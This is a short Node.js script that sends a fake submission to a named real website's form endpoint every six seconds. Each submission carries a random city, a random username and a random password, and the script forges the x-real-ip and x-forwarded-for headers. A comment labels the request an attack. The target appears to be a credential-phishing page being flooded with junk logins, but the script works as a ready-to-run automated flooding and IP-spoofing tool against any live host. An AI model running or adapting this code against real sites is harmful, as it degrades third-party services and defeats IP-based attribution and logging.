const express = require('express');
const axios = require('axios');
const randomNum = require('zhf.random-num');
const randomPassword = require('zhf.random-password');
const app = express();
setInterval(function () {
    // 地址
    const addressArr = ['北京市', '天津市', '辽宁省沈阳市', '吉林省长春市', '黑龙江省哈尔滨市', '上海市', '江苏省南京市', '湖北省武汉市', '广东省广州市', '重庆市', '四川省成都市', '陕西省西安市'];
    const address = addressArr[randomNum(addressArr.length - 1)];
    // ip
    const ip = `::ffff:${randomNum(1, 225)}.${randomNum(1, 225)}.${randomNum(1, 225)}.${randomNum(1, 225)}`;
    // 用户名
    const username = randomNum(100000, 9999999999);
    // 密码
    const password = randomPassword(randomNum(6, 16));
    console.log(address, ip, username, password);
    // 进攻
    axios({
        url: 'http://www.dnf-me.cn/in.asp?action=add',
        method: 'post',
        /*
        * 如果你没使用nginx代理服务器但是你用了'x-forwarded-for'获取ip
        * 如果你使用了nginx代理服务器但是你用了'x-real-ip'或者'x-forwarded-for'获取ip
        * 假设对方使用'x-nginx-proxy'判断是否使用了nginx
        * */
        headers: {
            'x-nginx-proxy': true,
            'x-real-ip': ip,
            'x-forwarded-for': ip,
        },
        data: {
            dede_fields: 'u,text;p,text',
            dede_fieldshash: 'd1WEGXsPu8CFufla1kRw8W8kW3QA2TG',
            ipku: address,
            ip: ip,
            j_dh: username,
            j_xm: password,
        },
    });
}, 6000);
app.listen('6661');
